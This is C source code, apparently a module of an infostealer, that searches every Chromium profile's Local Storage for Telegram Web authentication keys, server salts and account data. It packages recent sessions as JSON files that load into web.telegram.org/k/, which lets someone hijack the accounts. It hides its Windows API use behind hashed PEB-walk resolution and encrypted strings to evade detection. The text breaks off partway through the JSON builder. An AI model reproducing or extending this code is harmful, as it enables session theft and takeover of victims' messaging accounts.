/*
 * telegram_web.c вЂ” Telegram Web session extraction.
 *
 * Scans all Chromium profiles for web.telegram.org auth keys stored in
 * Local Storage LevelDB files.  Builds JSON import files compatible with
 * web.telegram.org/k/.
 *
 * All Win32 APIs resolved via PEB-walk (mirage_get_module_by_hash /
 * mirage_get_function_by_hash) вЂ” no IAT imports.
 *
 * Guarded by #ifdef ENABLE_TELEGRAM.
 */

#include "telegram_web.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "browser_paths.h"
#include "enc_strings.h"

#ifdef ENABLE_TELEGRAM
#ifdef _WIN32

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
/* time.h replaced - using GetSystemTimeAsFileTime via PEB */

/* Unix timestamp via PEB-walk (no CRT time() dependency) */
static long mirage_unix_timestamp(void) {
    typedef void (WINAPI *fnGSFT)(LPFILETIME);
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn_ts[32]; enc_decrypt(enc_GetSystemTimeAsFileTime, ENC_GETSYSTEMTIMEASFILETIME_LEN, fn_ts);
    fnGSFT pfn = (fnGSFT)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func(fn_ts));
    if (!pfn) return 0;
    FILETIME ft; pfn(&ft);
    unsigned long long raw = ((unsigned long long)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    return (long)((raw - 116444736000000000ULL) / 10000000ULL);
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Constants                                                      *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

#define TW_MAX_FILE_SIZE    (5 * 1024 * 1024)  /* 5 MB per LevelDB file */
#define TW_CONTEXT_WINDOW   500                  /* В±bytes around match */
#define TW_MAX_SESSIONS     16
#define TW_MAX_JSON_SIZE    8192
#define TW_PATH_LEN         1024
#define TW_MAX_PROFILES     32
#define TW_MAX_BROWSERS     64

/* DC numbers for auth key / salt arrays */
static const int dc_nums[] = { 1, 2, 4, 5 };

/* All tracked key names (19 keys) */
static const char *tg_all_keys[] = {
    "dc1_auth_key", "dc2_auth_key", "dc4_auth_key", "dc5_auth_key",
    "dc1_server_salt", "dc2_server_salt", "dc4_server_salt", "dc5_server_salt",
    "auth_key_fingerprint", "push_key",
    "userId", "dcId", "date",
    "k_build", "kz_version", "number_of_accounts",
    "tgme_sync", "user_auth", "xt_instance",
    NULL
};

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  API function pointer types                                     *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

typedef DWORD  (WINAPI *fnGetEnvA)(const char *, char *, DWORD);
typedef HANDLE (WINAPI *fnFindFirstFileA)(const char *, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *fnFindNextFileA)(HANDLE, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *fnFindClose)(HANDLE);
typedef DWORD  (WINAPI *fnGetFileAttributesA)(const char *);
typedef BOOL   (WINAPI *fnCreateDirectoryA)(const char *, void *);

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Resolved API pointers (lazy-initialized once)                  *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

static struct {
    fnGetEnvA            pGetEnvA;
    fnFindFirstFileA     pFF;
    fnFindNextFileA      pFN;
    fnFindClose          pFC;
    fnGetFileAttributesA pGFA;
    fnCreateDirectoryA   pMKDir;
    int                  ready;
} tw_api;

static void *tw_resolve(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static void *tw_resolve_enc(void *mod, const uint8_t *enc, size_t enc_len) {
    char name[32];
    enc_decrypt(enc, enc_len, name);
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int tw_ensure_api(void) {
    if (tw_api.ready) return 1;

    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    tw_api.pGetEnvA = (fnGetEnvA)           tw_resolve_enc(k32, enc_GetEnvironmentVariableA, ENC_GETENVIRONMENTVARIABLEA_LEN);
    tw_api.pFF      = (fnFindFirstFileA)    tw_resolve_enc(k32, enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN);
    tw_api.pFN      = (fnFindNextFileA)     tw_resolve_enc(k32, enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN);
    tw_api.pFC      = (fnFindClose)         tw_resolve_enc(k32, enc_FindClose, ENC_FINDCLOSE_LEN);
    tw_api.pGFA     = (fnGetFileAttributesA)tw_resolve_enc(k32, enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN);
    tw_api.pMKDir   = (fnCreateDirectoryA)  tw_resolve_enc(k32, enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN);

    if (!tw_api.pGetEnvA || !tw_api.pFF || !tw_api.pFN ||
        !tw_api.pFC || !tw_api.pGFA || !tw_api.pMKDir)
        return 0;

    tw_api.ready = 1;
    return 1;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Session data structure                                         *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

typedef struct {
    char account[64];       /* e.g. "account1" */
    char user_id[32];
    char dc_id[8];
    char date[32];
    char auth_keys[4][256]; /* dc1, dc2, dc4, dc5 */
    char salts[4][256];
    char fingerprint[256];
    char push_key[256];
    char k_build[64];
    char kz_version[64];
    char num_accounts[16];
    char tgme_sync[256];
    char user_auth[256];
    char xt_instance[256];
    int  match_count;
} TgSession;

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Helpers                                                        *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

static int tw_dir_exists(const char *path) {
    DWORD attr = tw_api.pGFA(path);
    return (attr != INVALID_FILE_ATTRIBUTES &&
            (attr & FILE_ATTRIBUTE_DIRECTORY));
}

static char *tw_path_join(const char *a, const char *b) {
    size_t la = strlen(a);
    size_t lb = strlen(b);
    char *out = (char *)malloc(la + 1 + lb + 1);
    if (!out) return NULL;
    memcpy(out, a, la);
    out[la] = '\\';
    memcpy(out + la + 1, b, lb);
    out[la + 1 + lb] = 0;
    return out;
}

/* Read file into malloc'd buffer.  Skips files > TW_MAX_FILE_SIZE. */
static unsigned char *tw_read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || (size_t)sz > TW_MAX_FILE_SIZE) {
        fclose(f);
        return NULL;
    }

    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }

    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }

    *out_len = (size_t)sz;
    return buf;
}

static int is_hex_string(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) {
        if ((*s >= '0' && *s <= '9') || (*s >= 'a' && *s <= 'f') ||
            (*s >= 'A' && *s <= 'F'))
            continue;
        return 0;
    }
    return 1;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Profile discovery (Default, Profile 1..N)                      *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

static size_t tw_find_profiles(const char *base_path,
                                char profiles[][TW_PATH_LEN],
                                size_t max_profiles) {
    size_t count = 0;

    /* "Default" */
    char *def = tw_path_join(base_path, "Default");
    if (def && tw_dir_exists(def)) {
        strncpy(profiles[count], def, TW_PATH_LEN - 1);
        profiles[count][TW_PATH_LEN - 1] = 0;
        count++;
    }
    free(def);

    /* "Profile 1" .. "Profile 99" (sequential вЂ” stop at first gap) */
    for (int i = 1; i < 100 && count < max_profiles; i++) {
        char name[32];
        snprintf(name, sizeof(name), "Profile %d", i);
        char *p = tw_path_join(base_path, name);
        if (!p) break;

        if (tw_dir_exists(p)) {
            strncpy(profiles[count], p, TW_PATH_LEN - 1);
            profiles[count][TW_PATH_LEN - 1] = 0;
            count++;
        } else {
            free(p);
            break;
        }
        free(p);
    }
    return count;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Value extraction вЂ” scan buffer for "key":"value"               *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

/*
 * Find "key" in buf, then extract the value after ':'.
 * Handles both  "key":"str"  and  "key": 123  forms.
 * Returns malloc'd string (caller frees), or NULL.
 */
static char *extract_json_value(const unsigned char *buf, size_t buf_len,
                                 const char *key) {
    size_t klen = strlen(key);
    /* Build search token: "key" */
    char pat[128];
    if (klen + 4 > sizeof(pat)) return NULL;
    pat[0] = '"';
    memcpy(pat + 1, key, klen);
    pat[klen + 1] = '"';
    pat[klen + 2] = 0;
    size_t plen = klen + 2;

    for (size_t i = 0; i + plen < buf_len; i++) {
        if (memcmp(buf + i, pat, plen) != 0) continue;

        size_t pos = i + plen;
        /* skip whitespace before colon */
        while (pos < buf_len && (buf[pos] == ' ' || buf[pos] == '\t'))
            pos++;
        if (pos >= buf_len || buf[pos] != ':') continue;
        pos++;
        /* skip whitespace after colon */
        while (pos < buf_len && (buf[pos] == ' ' || buf[pos] == '\t'))
            pos++;
        if (pos >= buf_len) continue;

        if (buf[pos] == '"') {
            /* Quoted string value */
            pos++;
            size_t start = pos;
            while (pos < buf_len && buf[pos] != '"') pos++;
            if (pos >= buf_len) continue;
            size_t vlen = pos - start;
            if (vlen == 0) continue;
            char *val = (char *)malloc(vlen + 1);
            if (!val) return NULL;
            memcpy(val, buf + start, vlen);
            val[vlen] = 0;
            return val;
        } else {
            /* Unquoted (numeric / bare) value */
            size_t start = pos;
            while (pos < buf_len &&
                   buf[pos] != ',' && buf[pos] != '}' && buf[pos] != ']' &&
                   buf[pos] != ' ' && buf[pos] != '\t' &&
                   buf[pos] != '\n' && buf[pos] != '\r')
                pos++;
            if (pos == start) continue;
            size_t vlen = pos - start;
            char *val = (char *)malloc(vlen + 1);
            if (!val) return NULL;
            memcpy(val, buf + start, vlen);
            val[vlen] = 0;
            return val;
        }
    }
    return NULL;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Scan one LevelDB file for Telegram Web sessions                *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

static int scan_leveldb_file(const unsigned char *buf, size_t buf_len,
                              TgSession *sessions, int *session_count) {
    int found = 0;
    static const char needle[] = "\"account";
    const size_t nlen = sizeof(needle) - 1;   /* 8 */

    for (size_t i = 0; i + nlen <= buf_len; i++) {
        if (memcmp(buf + i, needle, nlen) != 0) continue;

        /* в”Ђв”Ђ Extract account name (e.g. "account1") в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        char account[64] = {0};
        size_t astart = i + 1;   /* skip opening '"' */
        size_t aend   = astart;
        while (aend < buf_len && aend - astart < sizeof(account) - 1 &&
               buf[aend] != '"' && buf[aend] != ' ' && buf[aend] != ':')
            aend++;
        if (aend == astart) continue;
        memcpy(account, buf + astart, aend - astart);
        account[aend - astart] = 0;

        /* Must contain a digit (account1, account2, вЂ¦) */
        int has_digit = 0;
        for (const char *p = account; *p; p++)
            if (*p >= '0' && *p <= '9') { has_digit = 1; break; }
        if (!has_digit) continue;

        /* Skip duplicates */
        int dup = 0;
        for (int s = 0; s < *session_count; s++) {
            if (strcmp(sessions[s].account, account) == 0) {
                dup = 1; break;
            }
        }
        if (dup) continue;
        if (*session_count >= TW_MAX_SESSIONS) break;

        /* в”Ђв”Ђ Context window В±500 bytes в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        size_t ctx_start = (i >= (size_t)TW_CONTEXT_WINDOW)
                           ? i - TW_CONTEXT_WINDOW : 0;
        size_t ctx_end   = i + nlen + TW_CONTEXT_WINDOW;
        if (ctx_end > buf_len) ctx_end = buf_len;

        const unsigned char *ctx = buf + ctx_start;
        size_t ctx_len = ctx_end - ctx_start;

        /* в”Ђв”Ђ Scan for all 19 keys в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        TgSession sess;
        memset(&sess, 0, sizeof(sess));
        strncpy(sess.account, account, sizeof(sess.account) - 1);

        for (int k = 0; tg_all_keys[k]; k++) {
            char *val = extract_json_value(ctx, ctx_len, tg_all_keys[k]);
            if (!val) continue;

            sess.match_count++;
            const char *key = tg_all_keys[k];

            if (strcmp(key, "userId") == 0)
                strncpy(sess.user_id, val, sizeof(sess.user_id) - 1);
            else if (strcmp(key, "dcId") == 0)
                strncpy(sess.dc_id, val, sizeof(sess.dc_id) - 1);
            else if (strcmp(key, "date") == 0)
                strncpy(sess.date, val, sizeof(sess.date) - 1);
            else if (strcmp(key, "auth_key_fingerprint") == 0)
                strncpy(sess.fingerprint, val, sizeof(sess.fingerprint) - 1);
            else if (strcmp(key, "push_key") == 0)
                strncpy(sess.push_key, val, sizeof(sess.push_key) - 1);
            else if (strcmp(key, "k_build") == 0)
                strncpy(sess.k_build, val, sizeof(sess.k_build) - 1);
            else if (strcmp(key, "kz_version") == 0)
                strncpy(sess.kz_version, val, sizeof(sess.kz_version) - 1);
            else if (strcmp(key, "number_of_accounts") == 0)
                strncpy(sess.num_accounts, val, sizeof(sess.num_accounts) - 1);
            else if (strcmp(key, "tgme_sync") == 0)
                strncpy(sess.tgme_sync, val, sizeof(sess.tgme_sync) - 1);
            else if (strcmp(key, "user_auth") == 0)
                strncpy(sess.user_auth, val, sizeof(sess.user_auth) - 1);
            else if (strcmp(key, "xt_instance") == 0)
                strncpy(sess.xt_instance, val, sizeof(sess.xt_instance) - 1);
            else {
                /* dc auth_key / server_salt */
                for (int d = 0; d < 4; d++) {
                    char ak[32], sk[32];
                    snprintf(ak, sizeof(ak), "dc%d_auth_key", dc_nums[d]);
                    snprintf(sk, sizeof(sk), "dc%d_server_salt", dc_nums[d]);
                    if (strcmp(key, ak) == 0)
                        strncpy(sess.auth_keys[d], val,
                                sizeof(sess.auth_keys[d]) - 1);
                    else if (strcmp(key, sk) == 0)
                        strncpy(sess.salts[d], val,
                                sizeof(sess.salts[d]) - 1);
                }
            }
            free(val);
        }

        /* в”Ђв”Ђ Gate: в‰Ґ5 matches AND both userId and date в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        if (sess.match_count < 5 || !sess.user_id[0] || !sess.date[0])
            continue;

        /* в”Ђв”Ђ Skip sessions older than 30 days в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        {
            long session_ts = strtol(sess.date, NULL, 10);
            long now_ts     = mirage_unix_timestamp();
            if (session_ts > 0 && now_ts > 0 &&
                (now_ts - session_ts) > 30L * 24 * 3600)
                continue;
        }

        /* в”Ђв”Ђ Accept в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
        sessions[*session_count] = sess;
        (*session_count)++;
        found++;
    }
    return found;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  JSON builder вЂ” snprintf, no library needed                     *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

/*
 * Escape a string for JSON (" and \ only).  Returns bytes written
 * excluding NUL, or -1 on overflow.
 */
static int json_escape(char *dst, size_t dst_max, const char *src) {
    size_t pos = 0;
    for (; *src; src++) {
        char c = *src;
        if (c == '"' || c == '\\') {
            if (pos + 2 >= dst_max) return -1;
            dst[pos++] = '\\';
            dst[pos++] = c;
        } else {
            if (pos + 1 >= dst_max) return -1;
            dst[pos++] = c;
        }
    }
    dst[pos] = 0;
    return (int)pos;
}

/*
 * Build Telegram Web JSON import file.  Returns malloc'd string
 * (caller frees), or NULL on failure.
 */
static char *build_tg_json(const TgSession *sess, long exported_at) {
    char *json = (char *)malloc(TW_MAX_JSON_SIZE);
    if (!json) return NULL;

    int off = 0, rem = TW_MAX_JSON_SIZE, n;
    int first = 1;

    /* в”Ђв”Ђ Header в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
    n = snprintf(json + off, (size_t)rem,
        "{\n"
        "  \"exportedAt\": %ld,\n"
        "  \"origin\": \"https://web.telegram.org\",\n"
        "  \"path\": \"/k/\",\n"
        "  \"localStorage\": {",
        exported_at);
    if (n < 0 || n >= rem) goto fail;
    off += n; rem -= n;

    /* в”Ђв”Ђ account entry (inner JSON object as escaped string) в”Ђ */
    if (sess->account[0] && sess->user_id[0]) {
        char inner[512];
        snprintf(inner, sizeof(inner),
            "{\"userId\":%s,\"dcId\":%s,\"date\":%s}",
            sess->user_id,
            sess->dc_id[0] ? sess->dc_id : "0",
            sess->date[0]  ? sess->date  : "0");

        char esc[1024];
        json_escape(esc, sizeof(esc), inner);

        n = snprintf(json + off, (size_t)rem,
            "\n    \"%s\": \"%s\"", sess->account, esc);
        if (n < 0 || n >= rem) goto fail;
        off += n; rem -= n;
        first = 0;
    }

    /* в”Ђв”Ђ Auth keys в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
    for (int i = 0; i < 4; i++) {
        if (sess->auth_keys[i][0] && is_hex_string(sess->auth_keys[i])) {
            char key[32];
            snprintf(key, sizeof(key), "dc%d_auth_key", dc_nums[i]);
            n = snprintf(json + off, (size_t)rem,
                "%s\n    \"%s\": \"\\\"%s\\\"\"",
                first ? "" : ",", key, sess->auth_keys[i]);
            if (n < 0 || n >= rem) goto fail;
            off += n; rem -= n;
            first = 0;
        }
    }

    /* в”Ђв”Ђ Server salts в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
    for (int i = 0; i < 4; i++) {
        if (sess->salts[i][0]) {
            char key[32];
            snprintf(key, sizeof(key), "dc%d_server_salt", dc_nums[i]);
            n = snprintf(json + off, (size_t)rem,
                "%s\n    \"%s\": \"\\\"%s\\\"\"",
                first ? "" : ",", key, sess->salts[i]);
            if (n < 0 || n >= rem) goto fail;
            off += n; rem -= n;
            first = 0;
        }
    }

    /* в”Ђв”Ђ Remaining string fields в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
    #define ADD_STR(fname, fval) do {                               \
        if ((fval)[0]) {                                            \
            n = snprintf(json + off, (size_t)rem,                   \
                "%s\n    \"%s\": \"\\\"%s\\\"\"",                    \
                first ? "" : ",", fname, fval);                     \
            if (n < 0 || n >= rem) goto fail;                       \
            off += n; rem -= n; first = 0;                          \
        }                                                           \
    } while (0)

    ADD_STR("auth_key_fingerprint", sess->fingerprint);
    ADD_STR("push_key",             sess->push_key);
    ADD_STR("k_build",              sess->k_build);
    ADD_STR("kz_version",           sess->kz_version);
    ADD_STR("number_of_accounts",   sess->num_accounts);
    ADD_STR("tgme_sync",            sess->tgme_sync);
    ADD_STR("user_auth",            sess->user_auth);
    ADD_STR("xt_instance",          sess->xt_instance);

    #undef ADD_STR

    /* в”Ђв”Ђ Footer в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
